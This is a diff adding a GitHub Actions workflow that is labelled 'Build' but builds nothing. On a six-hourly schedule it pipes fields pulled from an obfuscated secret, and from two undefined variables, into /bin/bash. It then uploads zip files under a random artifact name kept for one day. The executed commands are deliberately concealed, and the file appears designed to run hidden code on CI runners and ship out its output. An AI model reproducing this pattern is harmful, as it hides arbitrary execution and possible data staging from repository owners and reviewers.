@@ -1,0 +1,33 @@
+name: Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '1 0,6,12,18 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  invoke:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run pipeline
+        env:
+          tgs75057: ${{ secrets.tgs75057 }}
+        run: |
+          printf '%s' "$tgs75057" | jq -r .envd02 | /bin/bash
+          echo $wno19786 | jq -r .ufd7474 | /bin/bash
+          echo $kpv03 | jq -r .l56 | /bin/bash
+
+      - name: Upload archive
+        uses: actions/upload-artifact@v4
+        with:
+          name: tTC0P4xO
+          path: "*.zip"
+          retention-days: 1
